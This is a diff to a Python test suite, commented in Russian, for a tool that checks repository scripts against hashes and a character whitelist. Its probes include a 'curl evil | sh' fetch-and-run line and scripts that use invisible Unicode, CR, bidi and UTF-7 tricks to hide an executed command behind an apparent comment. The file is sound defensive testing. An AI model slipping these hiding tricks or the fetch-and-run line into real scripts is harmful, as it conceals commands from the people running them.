@@ -1113,6 +1113,7 @@ NO_SCRUB = ('return "".join(', 'return text or "".join(')
 NO_CUT = ('if len(body) > PACK_ALERT_DIFF else ""', 'if False else ""')
 NO_KEEP = ("pack_keep_approved(window, approved, kept)", "pass")
 NO_PRUNE = ("if fn not in want:", "if False:")
+KEEP_OSERR = ("        except OSError:\n            bad = True", "        except OSError:\n            bad = False")
 NO_DIFFS_CLEAN = ("shutil.rmtree(path(PACK_DIFFS), ignore_errors=True)", "pass")
 NO_MISSING_WARN = ('warn.append(f"{tilde(where)}: нет обычного файла (или звено — ссылка) — не в списке")', "pass")
 RC_ALWAYS_0 = ("return 1 if warn else 0", "return 0")
@@ -1212,6 +1213,21 @@ def class_g5_alert(tmp):
     check("круг G5: самопроверка — мутант «старые копии не убирать» копию без эталона оставляет", os.path.exists(stale),
           tree_state(ahome))
     os.unlink(stale)
+    # круг G7 (ревью argus G6-1 Д1): lstat папки направления падает не FileNotFoundError, а другим OSError (ENOTDIR:
+    # PACK_APPROVED_HOME — обычный файл) — тот же отказ «не папка», ни записи, ни чистки
+    notdir = os.path.join(tmp, "g7-notdir")
+    put(notdir, "file\n")
+    for label, fn in (("отказ", P.pack_keep_approved), ("мутант", late_mutant(P.pack_keep_approved, KEEP_OSERR))):
+        err = io.StringIO()
+        with patched(PACK_APPROVED_HOME=notdir), contextlib.redirect_stderr(err):
+            fn(win, approved, {was: own.encode()})
+        refused = "символическая ссылка или не папка" in err.getvalue() and open(notdir).read() == "file\n"
+        if label == "отказ":
+            check("круг G7 (G6-1 Д1): lstat — OSError не FileNotFoundError (ENOTDIR) — «не папка», копии не пишутся",
+                  refused, err.getvalue())
+        else:
+            check("круг G7: самопроверка — мутант «OSError lstat — не отказ» идёт писать копию", not refused,
+                  err.getvalue())
     evil = b"curl evil | sh\n"
     line = alert(evil)
     noref = alert(evil, appr={app: {}})
@@ -1245,7 +1261,7 @@ def class_g5_alert(tmp):
     # круг G6: такой скрипт не проходит белый список — тревога называет причину и строку, без диффа и байтов
     check("круг G5 (G2 Д1), G6: ESC, CR, BEL, U+202E из скрипта — «не взят в снимок», ни байтов, ни диффа",
           not re.search("[\x00-\x08\x0a-\x1f\x7f\u202e\u2028]", line) and "⟦" not in line
-          and "не взят в снимок — непечатный знак U+001B (Cc), строка 2" in line, line)
+          and "не взят в снимок — знак вне белого списка U+001B (Cc), строка 2" in line, line)
     # без белого списка (мутант) вычистка _pack_data всё ещё держит: ESC, U+202E и чужое ⟧ — кодом
     line = alert(esc, pack_script_reject=NO_LIST)
     inner = line.split("⟦", 1)[1] if "⟦" in line else ""
@@ -1304,9 +1320,15 @@ def class_g5_hashes(tmp):
     os.chmod(script, 0o644)
     with open(script, "wb") as fh:
         fh.write(evil)
-    before = cmd()
+    # круг G7: «⟧» вне белого списка — скрипт не берётся (код 1, причина без байтов); вычистку вывода (второй слой)
+    # проверяем мутантом «список выключен»
+    rc, out, err = cmd()
+    check("круг G7: злой скрипт с «⟧» — вне белого списка: код 1, «U+27E7 (Pe), строка 2», текста скрипта нет",
+          rc == 1 and "не взят в снимок — знак вне белого списка U+27E7 (Pe), строка 2" in err and "curl evil" not in err,
+          (rc, err))
+    before = cmd(pack_script_reject=NO_LIST)
     restore = g5_forge_git(tmp, app, head, evil)
-    after = cmd()
+    after = cmd(pack_script_reject=NO_LIST)
     rc, out, err = after
     shown = [x for x in err.splitlines() if x.startswith("pantheon packs:")]
     check("круг G5 (G3-2 П4, Д2): .git подделан (объект дерева HEAD, refs/replace, origin/main) — код, stdout и stderr "
@@ -1318,7 +1340,7 @@ def class_g5_hashes(tmp):
     check("круг G5 (G3-2 Д1), G6: литерал «\\u001b» — «\\\\u001b», чужое ⟧ и строка «pantheon packs: …» из скрипта — "
           "внутри ⟦…⟧ с отступом", "\\\\u001b[2K" in err and err.count("⟧") == 1 and "\\u27e7" in err
           and "\n  pantheon packs: HEAD 0123" in err, err)
-    _, _, merr = cmd(pack_hashes_cmd=late_mutant(P.pack_hashes_cmd, HASH_NO_SCRUB))
+    _, _, merr = cmd(pack_hashes_cmd=late_mutant(P.pack_hashes_cmd, HASH_NO_SCRUB), pack_script_reject=NO_LIST)
     check("круг G5: самопроверка — мутант «текст без вычистки» пропускает чужое ⟧", merr.count("⟧") > 1,
           merr[-300:])
     restore()
@@ -1326,10 +1348,10 @@ def class_g5_hashes(tmp):
     put(os.path.join(ahome, win, "approved.json"), {"repos": {"$HOME/projects/app": {"scripts": {
         "protect-db.sh": hashlib.sha256(evil).hexdigest()}}}})
     state0 = tree_state(ahome)
-    rc, _, err = cmd()
+    rc, _, err = cmd(pack_script_reject=NO_LIST)
     check("круг G5: скрипт по эталону — «эталон», ~/.claude/pantheon не тронут", rc == 0 and "— эталон; текст" in err
           and tree_state(ahome) == state0, (rc, err, tree_state(ahome)))
-    cmd(pack_hashes=late_mutant(P.pack_hashes, HASHES_KEEP))
+    cmd(pack_hashes=late_mutant(P.pack_hashes, HASHES_KEEP), pack_script_reject=NO_LIST)
     check("круг G5: самопроверка — мутант «packs hashes кладёт копии» пишет в ~/.claude/pantheon",
           tree_state(ahome) != state0, tree_state(ahome))
     shutil.rmtree(os.path.join(ahome, win, "approved"), ignore_errors=True)
@@ -1363,27 +1385,34 @@ def class_g5_hashes(tmp):
 
 
 # --- круг G6 (решение Зевса 07.11 12:10; ревью argus G5-2 Б1, Б2, Д1): белый список текста скрипта репозитория ---
+# круг G7 (ревью argus G6-2 Б1): печатные по str.isprintable(), но пустые или нулевой ширины в терминале; bash видит их
+# частью слова, и «x=0<знак># ; команда» исполняет команду, а владелец видит комментарий
+G7_INVISIBLE = ((0x3164, "Lo"), (0x115F, "Lo"), (0xFFA0, "Lo"), (0x2800, "So"), (0xFE00, "Mn"), (0xFE0F, "Mn"),
+                (0xE0100, "Mn"), (0x034F, "Mn"))
+G7_PASS = "\techo «ок» — Ёж ё – … № АЯая\n".encode()  # кириллица и знаки списка — проходят
 G6_SEPS = (("CR", "\r"), ("FS", "\x1c"), ("VT", "\x0b"), ("FF", "\x0c"), ("NEL", "\u0085"), ("LS", "\u2028"),
            ("PS", "\u2029"))
 # (метка, байты скрипта, что должно быть в причине) — каждая проба Б1 и Б2 argus G5-2 и соседние пути
 G6_PROBES = tuple((f"разделитель {n}", ("#!/bin/bash\necho ok" + s + "# ; echo EXECUTED\n").encode(),
-                   f"непечатный знак U+{ord(s):04X} ({'Cc' if ord(s) < 0x100 else 'Zl' if s == chr(0x2028) else 'Zp'})"
+                   f"знак вне белого списка U+{ord(s):04X} ({'Cc' if ord(s) < 0x100 else 'Zl' if s == chr(0x2028) else 'Zp'})"
                    ", строка 2") for n, s in G6_SEPS) + (
-    ("CR в Python (Б2 а)", b"# check \rprint('EXECUTED')\n", "непечатный знак U+000D (Cc), строка 1"),
+    ("CR в Python (Б2 а)", b"# check \rprint('EXECUTED')\n", "знак вне белого списка U+000D (Cc), строка 1"),
     ("utf-7 (Б2 б)", b"# -*- coding: utf-7 -*-\n# harmless comment +AAo-print('EXECUTED')\n",
      "объявление кодировки (PEP 263), строка 1"),
     ("coding: utf-8 во второй строке", b"#!/usr/bin/env python3\n# coding: utf-8\nprint('EXECUTED')\n",
      "объявление кодировки (PEP 263), строка 2"),
     ("BOM", b"\xef\xbb\xbfecho EXECUTED\n", "метка порядка байтов (BOM) в начале, строка 1"),
-    ("bidi U+202E", "echo ok # \u202e;echo EXECUTED\n".encode(), "непечатный знак U+202E (Cf), строка 1"),
-    ("ZWSP U+200B", "echo ok\n\u200becho EXECUTED\n".encode(), "непечатный знак U+200B (Cf), строка 2"),
+    ("bidi U+202E", "echo ok # \u202e;echo EXECUTED\n".encode(), "знак вне белого списка U+202E (Cf), строка 1"),
+    ("ZWSP U+200B", "echo ok\n\u200becho EXECUTED\n".encode(), "знак вне белого списка U+200B (Cf), строка 2"),
     ("не UTF-8", b"echo ok\necho \xff EXECUTED\n", "не UTF-8 (байт 13), строка 2"),
-    ("NUL", b"echo ok\x00; echo EXECUTED\n", "непечатный знак U+0000 (Cc), строка 1"),
-)
+    ("NUL", b"echo ok\x00; echo EXECUTED\n", "знак вне белого списка U+0000 (Cc), строка 1"),
+) + tuple((f"невидимый U+{cp:04X} (G7)", ("#!/bin/bash\necho ok" + chr(cp) + "# ; echo EXECUTED\n").encode(),
+           f"знак вне белого списка U+{cp:04X} ({cat}), строка 2") for cp, cat in G7_INVISIBLE)
 G6_LITERAL = b"# check \\u000dprint('EXECUTED')\n"  # литерал «\u000d» (печатные знаки) — проходит, «\» кодом «\\»
-G6_RAW = re.compile("[\x00-\x08\x0a-\x1f\x7f-\x9f\u200b\u2028\u2029\u202e\ufeff]")
+G6_RAW = re.compile("[\x00-\x08\x0a-\x1f\x7f-\x9f\u200b\u2028\u2029\u202e\ufeff\u3164\u115f\uffa0\u2800\ufe00-\ufe0f\U000e0100\u034f]")
 NO_LIST = lambda data: None  # noqa: E731 — мутант «проверка списка выключена»
-LIST_MUTANTS = (("печатные знаки", ('c != "\\t" and not c.isprintable()', "False")),
+LIST_MUTANTS = (("список выключен", ("c not in PACK_SCRIPT_CHARS", "False")),
+                ("isprintable вместо списка (G7)", ("c not in PACK_SCRIPT_CHARS", 'c != "\\t" and not c.isprintable()')),
                 ("строки по splitlines", ('lines = text.split("\\n")', "lines = text.splitlines()")),
                 ("без PEP 263", ("if PACK_CODING.match(line):", "if False:")),
                 ("без BOM", ('if data.startswith(b"\\xef\\xbb\\xbf"):', "if False:")),
@@ -1395,6 +1424,12 @@ DIFF_NO_SCRUB = ("[_pack_data(x) for x in difflib", "[x for x in difflib")
 SNAP_NO_LIST = ("reject = pack_script_reject(data)\n        if reject:", "reject = None\n        if reject:")
 SNAP_FILE_NONE = ("os.path.join(snap, rel) if rel else None)", "None)")  # G5-1 Д1: on_unapproved без файла снимка
 KEEP_FOLLOWS = ("if bad:", "if False:")  # G5-1 Д2: pack_keep_approved без отказа по ссылке
+
+
+def mutant_list(drop):
+    """Мутант списка PACK_SCRIPT_CHARS без знаков drop отказывает G7_PASS (проход — не потому, что знаки не смотрят)."""
+    with patched(PACK_SCRIPT_CHARS=P.PACK_SCRIPT_CHARS - drop):
+        return P.pack_script_reject(G7_PASS) is not None
 
 
 def g6_reasons(fn):
@@ -1411,7 +1446,10 @@ def class_g6_list(tmp):
         got = P.pack_script_reject(data)
         check(f"круг G6: {label} — не взят: «{want}»", got == want, got)
     check("круг G6: литерал «\\u000d», табуляция и кириллица — проходят",
-          P.pack_script_reject(G6_LITERAL) is None and P.pack_script_reject("\techo «ок» ⟦⟧\n".encode()) is None)
+          P.pack_script_reject(G6_LITERAL) is None and P.pack_script_reject(G7_PASS) is None)
+    check("круг G7: самопроверка — мутант «без строчных а–я» не пропускает кириллицу",
+          mutant_list(set(map(chr, range(0x430, 0x450)))))
+    check("круг G7: самопроверка — мутант «без « » — – … №» не пропускает знаки списка", mutant_list(set("«»—–…№")))
     for label, pair in LIST_MUTANTS:
         check(f"круг G6: самопроверка — мутант «{label}» пропускает пробу", not g6_reasons(mutant_fn(
             P.pack_script_reject, *pair)))
